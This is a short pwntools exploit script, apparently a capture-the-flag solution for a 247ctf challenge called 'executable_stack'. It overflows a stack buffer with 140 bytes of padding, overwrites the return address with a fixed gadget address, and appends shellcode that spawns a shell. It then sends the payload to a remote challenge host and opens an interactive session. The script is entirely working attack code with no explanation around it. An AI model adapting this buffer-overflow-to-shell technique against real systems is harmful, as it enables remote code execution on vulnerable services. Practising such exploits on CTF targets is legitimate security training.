from pwn import *

elf = context.binary = ELF('./executable_stack')
context.log_level = 'debug'
context.terminal = 'kitty'

offset = 140

p = remote('c16a56cd7d923324.247ctf.com', 50473)
# p = gdb.debug('./executable_stack')
# p = process()

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.raw(0x080484b3)
rop.raw(asm(shellcraft.sh()))

print(rop.dump())

p.sendlineafter(':', rop.chain())

p.interactive()
